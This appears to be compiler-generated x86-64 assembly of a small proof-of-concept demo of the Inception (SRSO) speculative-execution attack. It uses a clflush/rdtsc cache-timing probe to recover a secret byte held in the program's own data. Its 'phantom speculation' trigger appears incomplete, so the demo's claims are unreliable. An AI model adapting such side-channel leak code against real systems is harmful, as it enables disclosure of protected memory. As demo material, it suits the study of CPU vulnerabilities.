	.file	"inception_x86.c"
	.text
	.comm	probe_array,16384,32
	.globl	flush_probe_array
	.type	flush_probe_array, @function
flush_probe_array:
.LFB4262:
	.cfi_startproc
	endbr64
	pushq	%rbp
	.cfi_def_cfa_offset 16
	.cfi_offset 6, -16
	movq	%rsp, %rbp
	.cfi_def_cfa_register 6
	movl	$0, -12(%rbp)
	jmp	.L2
.L3:
	movl	-12(%rbp), %eax
	sall	$6, %eax
	cltq
	leaq	probe_array(%rip), %rdx
	addq	%rdx, %rax
	movq	%rax, -8(%rbp)
	movq	-8(%rbp), %rax
	clflush	(%rax)
	nop
	addl	$1, -12(%rbp)
.L2:
	cmpl	$255, -12(%rbp)
	jle	.L3
	mfence
	nop
	nop
	popq	%rbp
	.cfi_def_cfa 7, 8
	ret
	.cfi_endproc
.LFE4262:
	.size	flush_probe_array, .-flush_probe_array
	.type	rdtsc, @function
rdtsc:
.LFB4263:
	.cfi_startproc
	pushq	%rbp
	.cfi_def_cfa_offset 16
	.cfi_offset 6, -16
	movq	%rsp, %rbp
	.cfi_def_cfa_register 6
	rdtsc
	salq	$32, %rdx
	orq	%rdx, %rax
	popq	%rbp
	.cfi_def_cfa 7, 8
	ret
	.cfi_endproc
.LFE4263:
	.size	rdtsc, .-rdtsc
	.globl	measure_access_time
	.type	measure_access_time, @function
measure_access_time:
.LFB4264:
	.cfi_startproc
	endbr64
	pushq	%rbp
	.cfi_def_cfa_offset 16
	.cfi_offset 6, -16
	movq	%rsp, %rbp
	.cfi_def_cfa_register 6
	subq	$40, %rsp
	movq	%rdi, -40(%rbp)
	movl	$0, %eax
	call	rdtsc
	movq	%rax, -16(%rbp)
	movq	-40(%rbp), %rax
	movzbl	(%rax), %eax
	movb	%al, -17(%rbp)
	mfence
	nop
	movl	$0, %eax
	call	rdtsc
	movq	%rax, -8(%rbp)
	movq	-8(%rbp), %rax
	subq	-16(%rbp), %rax
	leave
	.cfi_def_cfa 7, 8
	ret
	.cfi_endproc
.LFE4264:
	.size	measure_access_time, .-measure_access_time
	.globl	benign_target
	.type	benign_target, @function
benign_target:
.LFB4265:
	.cfi_startproc
	endbr64
	pushq	%rbp
	.cfi_def_cfa_offset 16
	.cfi_offset 6, -16
	movq	%rsp, %rbp
	.cfi_def_cfa_register 6
	nop
	popq	%rbp
	.cfi_def_cfa 7, 8
	ret
	.cfi_endproc
.LFE4265:
	.size	benign_target, .-benign_target
	.globl	common_init
	.type	common_init, @function
common_init:
.LFB4266:
	.cfi_startproc
	endbr64
	pushq	%rbp
	.cfi_def_cfa_offset 16
	.cfi_offset 6, -16
	movq	%rsp, %rbp
	.cfi_def_cfa_register 6
	subq	$16, %rsp
	movl	$16384, %edx
	movl	$0, %esi
	leaq	probe_array(%rip), %rdi
	call	memset@PLT
	movl	$0, -4(%rbp)
	jmp	.L11
.L12:
	movl	-4(%rbp), %eax
	cltq
	leaq	probe_array(%rip), %rdx
	movb	$1, (%rax,%rdx)
	addl	$64, -4(%rbp)
.L11:
	cmpl	$16383, -4(%rbp)
	jle	.L12
	mfence
	nop
	movl	$0, %eax
	call	flush_probe_array
	mfence
	nop
	nop
	leave
	.cfi_def_cfa 7, 8
	ret
	.cfi_endproc
.LFE4266:
	.size	common_init, .-common_init
	.section	.rodata
.LC0:
	.string	"Measuring cache timings..."
	.align 8
.LC1:
	.string	"Leaked %s (speculatively): %c (ASCII %d), Access Time: %lld cycles\n"
	.align 8
.LC2:
	.string	"SUCCESS! Leaked the actual %s.\n"
	.align 8
.LC3:
	.string	"LEAKED VALUE DOES NOT MATCH ACTUAL %s.\n"
	.align 8
.LC4:
	.string	"No %s leaked or could not detect leakage.\n"
	.text
	.globl	perform_measurement
	.type	perform_measurement, @function
perform_measurement:
.LFB4267:
	.cfi_startproc
	endbr64
	pushq	%rbp
	.cfi_def_cfa_offset 16
	.cfi_offset 6, -16
	movq	%rsp, %rbp
	.cfi_def_cfa_register 6
	subq	$64, %rsp
	movl	%edi, %eax
	movq	%rsi, -64(%rbp)
	movb	%al, -52(%rbp)
	leaq	.LC0(%rip), %rdi
	call	puts@PLT
	movl	$-1, -36(%rbp)
	movq	$-1, -24(%rbp)
	movl	$50, -28(%rbp)
	movl	$0, -32(%rbp)
	jmp	.L14
.L17:
	movl	-32(%rbp), %eax
	sall	$6, %eax
	cltq
	leaq	probe_array(%rip), %rdx
	addq	%rdx, %rax
	movq	%rax, -16(%rbp)
	movq	-16(%rbp), %rax
	movq	%rax, %rdi
	call	measure_access_time
	movq	%rax, -8(%rbp)
	movl	-28(%rbp), %eax
	cltq
	cmpq	%rax, -8(%rbp)
	jge	.L15
	cmpq	$-1, -24(%rbp)
	je	.L16
	movq	-8(%rbp), %rax
	cmpq	-24(%rbp), %rax
	jge	.L15
.L16:
	movq	-8(%rbp), %rax
	movq	%rax, -24(%rbp)
	movl	-32(%rbp), %eax
	movl	%eax, -36(%rbp)
.L15:
	addl	$1, -32(%rbp)
.L14:
	cmpl	$255, -32(%rbp)
	jle	.L17
	cmpl	$-1, -36(%rbp)
	je	.L18
	movl	-36(%rbp), %eax
	movsbl	%al, %edx
	movq	-24(%rbp), %rsi
	movl	-36(%rbp), %ecx
	movq	-64(%rbp), %rax
	movq	%rsi, %r8
	movq	%rax, %rsi
	leaq	.LC1(%rip), %rdi
	movl	$0, %eax
	call	printf@PLT
	movzbl	-52(%rbp), %eax
	cmpl	%eax, -36(%rbp)
	jne	.L19
	movq	-64(%rbp), %rax
	movq	%rax, %rsi
	leaq	.LC2(%rip), %rdi
	movl	$0, %eax
	call	printf@PLT
	movl	$1, %eax
	jmp	.L20
.L19:
	movq	-64(%rbp), %rax
	movq	%rax, %rsi
	leaq	.LC3(%rip), %rdi
	movl	$0, %eax
	call	printf@PLT
	movl	$0, %eax
	jmp	.L20
.L18:
	movq	-64(%rbp), %rax
	movq	%rax, %rsi
	leaq	.LC4(%rip), %rdi
	movl	$0, %eax
	call	printf@PLT
	movl	$0, %eax
.L20:
	leave
	.cfi_def_cfa 7, 8
	ret
	.cfi_endproc
.LFE4267:
	.size	perform_measurement, .-perform_measurement
	.globl	secret_inception_data
	.data
	.type	secret_inception_data, @object
	.size	secret_inception_data, 1
secret_inception_data:
	.byte	73
	.text
	.globl	leak_gadget_inception
	.type	leak_gadget_inception, @function
leak_gadget_inception:
.LFB4268:
	.cfi_startproc
	endbr64
	pushq	%rbp
	.cfi_def_cfa_offset 16
	.cfi_offset 6, -16
	movq	%rsp, %rbp
	.cfi_def_cfa_register 6
	movl	%edi, %eax
	movb	%al, -20(%rbp)
	movzbl	-20(%rbp), %eax
	sall	$6, %eax
	cltq
	leaq	probe_array(%rip), %rdx
	movb	$1, (%rax,%rdx)
	movzbl	-20(%rbp), %eax
	addl	%eax, %eax
	movl	%eax, -4(%rbp)
	movl	-4(%rbp), %eax
	nop
	popq	%rbp
	.cfi_def_cfa 7, 8
	ret
	.cfi_endproc
.LFE4268:
	.size	leak_gadget_inception, .-leak_gadget_inception
	.globl	victim_function_inception
	.type	victim_function_inception, @function
victim_function_inception:
.LFB4269:
	.cfi_startproc
	endbr64
	pushq	%rbp
	.cfi_def_cfa_offset 16
	.cfi_offset 6, -16
	movq	%rsp, %rbp
	.cfi_def_cfa_register 6
	movl	$0, -8(%rbp)
	movl	$0, -4(%rbp)
	jmp	.L23
.L24:
	movl	-8(%rbp), %edx
	movl	-4(%rbp), %eax
	addl	%edx, %eax
	movl	%eax, -8(%rbp)
	addl	$1, -4(%rbp)
.L23:
	cmpl	$9, -4(%rbp)
	jle	.L24
	movl	-8(%rbp), %eax
	nop
	popq	%rbp
	.cfi_def_cfa 7, 8
	ret
	.cfi_endproc
.LFE4269:
	.size	victim_function_inception, .-victim_function_inception
	.section	.rodata
	.align 8
.LC5:
	.string	"\n--- Running Inception (SRSO) Demo (x86-compatible) ---"
	.align 8
.LC6:
	.string	"Triggering phantom speculation to overflow RAS..."
	.align 8
.LC7:
	.string	"Setting up r8 with gadget address: %p\n"
	.align 8
.LC8:
	.string	"Setting up r9 with secret data: %c (0x%02x)\n"
	.align 8
.LC9:
	.string	"Triggering victim function with return..."
.LC10:
	.string	"Inception secret"
.LC11:
	.string	"Actual secret data: %c\n"
	.text
	.globl	main
	.type	main, @function
main:
.LFB4270:
	.cfi_startproc
	endbr64
	pushq	%rbp
	.cfi_def_cfa_offset 16
	.cfi_offset 6, -16
	movq	%rsp, %rbp
	.cfi_def_cfa_register 6
	movl	$0, %eax
	call	common_init
	leaq	.LC5(%rip), %rdi
	call	puts@PLT
	leaq	.LC6(%rip), %rdi
	call	puts@PLT
	leaq	leak_gadget_inception(%rip), %rsi
	leaq	.LC7(%rip), %rdi
	movl	$0, %eax
	call	printf@PLT
	movzbl	secret_inception_data(%rip), %eax
	movzbl	%al, %edx
	movzbl	secret_inception_data(%rip), %eax
	movzbl	%al, %eax
	movl	%eax, %esi
	leaq	.LC8(%rip), %rdi
	movl	$0, %eax
	call	printf@PLT
	leaq	leak_gadget_inception(%rip), %r8
	movzbl	secret_inception_data(%rip), %eax
	movl	%eax, %r9d
#APP
# 71 "inception_x86.c" 1
	.rept 256
	xor %eax, %eax
	nop
	nop
	nop
	.endr

# 0 "" 2
#NO_APP
	mfence
	nop
	movl	$0, %eax
	call	flush_probe_array
	mfence
	nop
	movl	$0, %eax
	call	flush_probe_array
	lfence
	nop
	leaq	.LC9(%rip), %rdi
	call	puts@PLT
	leaq	leak_gadget_inception(%rip), %r8
	movzbl	secret_inception_data(%rip), %eax
	movl	%eax, %r9d
	movl	$0, %eax
	call	victim_function_inception
	lfence
	nop
	movzbl	secret_inception_data(%rip), %eax
	movzbl	%al, %eax
	leaq	.LC10(%rip), %rsi
	movl	%eax, %edi
	call	perform_measurement
	movzbl	secret_inception_data(%rip), %eax
	movzbl	%al, %eax
	movl	%eax, %esi
	leaq	.LC11(%rip), %rdi
	movl	$0, %eax
	call	printf@PLT
	movl	$0, %eax
	popq	%rbp
	.cfi_def_cfa 7, 8
	ret
	.cfi_endproc
.LFE4270:
	.size	main, .-main
	.ident	"GCC: (Ubuntu 9.4.0-1ubuntu1~20.04.2) 9.4.0"
	.section	.note.GNU-stack,"",@progbits
	.section	.note.gnu.property,"a"
	.align 8
	.long	 1f - 0f
	.long	 4f - 1f
	.long	 5
0:
	.string	 "GNU"
1:
	.align 8
	.long	 0xc0000002
	.long	 3f - 2f
2:
	.long	 0x3
3:
	.align 8
4:
